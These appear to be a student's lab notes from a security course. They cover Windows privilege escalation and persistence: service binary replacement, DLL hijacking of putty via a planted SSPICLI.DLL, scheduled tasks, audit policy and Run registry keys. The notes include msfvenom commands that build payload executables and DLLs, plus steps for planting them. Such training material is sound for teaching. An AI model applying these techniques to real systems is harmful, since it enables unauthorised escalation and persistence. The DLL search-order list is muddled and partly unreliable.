# Privilege Escalation, Persistence & covering your tracks


## DLL Search Order
executables check the following locations (in opposite order)
- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
- The directory the the Application was run from
- The directory specified in in the C+ function GetSystemDirectory()
- The directory specified in the C+ function GetWindowsDirectory()
- The current directory

WILL NEED AUDITPOL COMMAND ON EXAM
![image](https://github.com/hannahsfrommt/Security/assets/140441321/81887602-5242-4b0c-b127-69612f44ed69)



## DEMO
### ~binary replacement concept~
open services app
take advantage of lazy admins
organize by description
go to files and see if can add files, or replace names
pull up linux op station
`msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\\Users\DemoAdmin\Desktop\whoami.txt' -f exe > 7z.exe`
`ls`
`file 7z.exe`
get this to our demo box
on windows cmd
`scp student@10.50.X.X:7z.exe .`
copy it into directory on windows file system 
changed the name of theirs and made mine the actual name so it fires up my version at start up
restart box
see whoami.txt on the Desktop

### ~schtasks~
open up task scheduler
scheduled tasks should stand out to you
might see no description
look at trigger and understand it
remember system runs scheduled tasks
what is the action

### ~dll hijacking~
look at file in file system
see cannot write to directory, use admin priv to write hehe (could do the same thing as before w the msfvenom)
press view to see full names and hidden files
download process monitor and unzip it in file system
alternative binaries download putty.exe
open process monitor 
filter > filter
Path contains .dll
Process Name comtains putty.exe
Result contains .dll
cant replace binary so going to replace dll
go on linux again
`msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\\Users\DemoAdmin\Desktop\whoamiPutty.txt' -f dll > SSPICLI.DLL`
`ls`
`file SSPICLI.DLL`
on windows box
`scp student@10.50.X.X:SSPICLI.DLL ./Desktop`
see dll is sitting on desktop
throw it in the same place as putty
now launch putty and it called out our dll bc it checks the same directory first

### ~logs~
in windows cmd
`auditpol /get /category:*`
`auditpol /get /category:* | findstr "Success and Failure"`
open event viewer
see application, security (log ons), system(system start and stop)
on right you can filter for event id for example...can google the event id

### ~registry~
regedit 
look at HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run or RunOnce
check it is of value
